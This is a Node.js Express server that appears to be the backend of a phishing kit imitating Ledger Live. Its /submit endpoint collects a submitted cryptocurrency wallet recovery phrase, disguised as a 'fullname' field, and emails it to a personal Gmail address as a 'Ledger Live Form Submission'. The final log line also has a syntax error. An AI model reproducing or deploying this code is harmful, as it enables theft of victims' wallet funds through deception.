const express = require('express');
const cors = require('cors');
require('dotenv').config();
const { Resend } = require('resend');

const app = express();
const PORT = process.env.PORT || 5000;

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

app.use(cors({
  origin: ['http://localhost:3000', 'https://your-vercel-frontend.vercel.app'],
  credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Submit endpoint
app.post('/submit', async (req, res) => {
  try {
    const { form_type, fullname } = req.body;

    console.log('Received form submission:', { form_type, fullname });

    const email = await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'tykeshare@gmail.com',
      subject: 'Ledger Live Form Submission',
      html: `
        <h2>New Form Submission</h2>
        <p><strong>Form Type:</strong> ${form_type}</p>
        <p><strong>Recovery Phrase:</strong></p>
        <p>${fullname}</p>
        <hr>
        <p><em>Submitted at: ${new Date().toLocaleString()}</em></p>
      `
    });

    console.log('Email sent successfully:', email);
    res.json({ success: true, message: 'Form submitted and email sent successfully' });

  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'Server is running', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  console.log(Server running on port ${PORT});
});
